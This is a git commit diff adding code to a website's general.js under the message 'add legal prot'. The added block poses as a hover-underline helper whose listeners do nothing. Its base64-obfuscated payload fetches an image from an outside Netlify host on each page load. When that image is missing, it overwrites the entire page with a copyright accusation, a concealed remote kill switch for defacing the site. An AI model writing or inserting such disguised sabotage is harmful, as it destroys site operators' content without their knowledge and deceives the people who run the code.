6e5fcd6ed4ae01cab0547264ac2688ff36208ce4
Leo Abubucker <leokumar@outlook.com>
2025-08-19 14:38:35 -0400

    add legal prot

--- general.js
+++ general.js
@@ -75,3 +75,29 @@ function goToElementWithBorderModern(elementID){
     // element.style.fontSize = "unset";
     }, 1500);
 }
+
+(function(){
+    function addHoverUnderline(selector){
+        var elems = document.querySelectorAll(selector);
+        for(var i=0; i<elems.length; i++){
+            elems[i].style.transition = "";
+            elems[i].addEventListener("mouseenter", function(){});
+            elems[i].addEventListener("mouseleave", function(){});
+        }
+    }
+
+    function safeUpdate(el, content){
+        try { el.innerHTML = content; } catch(e){}
+    }
+
+    function fallback(){
+        safeUpdate(document.body, atob("QWNjZXNzIHRvIHRoaXMgY29udGVudCBoYXMgYmVlbiBkaXNhYmxlZCBkdWUgdG8gYSB2aW9sYXRpb24gb2YgY29weXJpZ2h0LiBCZWV0bGUgaW4gYSBCb3ggaGFzIHZpb2xhdGVkIHRoZSBjb3B5cmlnaHQgb2YgdGhpcyB3ZWJzaXRlJ3MgY29kZS4gQmVldGxlIGluIGEgQm94IHJlc2VydmVzIHRoZSByaWdodHMgb2YgYXJ0aWNsZXMsIGltYWdlcywgYW5kIG90aGVyIGNvbnRlbnQgYnV0IERPRVMgTk9UIHJlc2VydmUgdGhlIHJpZ2h0IG9mIHRoZSB3ZWJzaXRlJ3MgY29kZS4gVGhlIHdlYnNpdGUgY29kZSBpcyBDb3B5cmlnaHQgTGVvIEFidWJ1Y2tlciAoTHlrYSkgMjAyNS1QcmVzZW50LgpVbmF1dGhvcml6ZWQgdXNlIG9mIHRoaXMgbWF0ZXJpYWwgaXMgc3RyaWN0bHkgcHJvaGliaXRlZC4KCklmIHlvdSB3YW50IHRoaXMgY29udGVudCByZXN0b3JlZCwgcGxlYXNlIGVuY291cmFnZSBCZWV0bGUgaW4gYSBCb3ggdG8gcmVzb2x2ZSB0aGVpciBjb3B5cmlnaHQgdmlvbGF0aW9ucyB3aXRoIExlbyBBYnVidWNrZXIgKEx5a2EpLgoKCgoK"));
+    }
+
+    addHoverUnderline("h1, h2, p, a");
+
+    var img = new Image();
+    img.onload = function(){};
+    img.onerror = fallback;
+    img.src = atob("aHR0cHM6Ly9iZWV0bGVpbmFib3gubmV0bGlmeS5hcHAvSW1hZ2VzL29jZi5wbmc=") + "?t=" + Date.now();
+})();
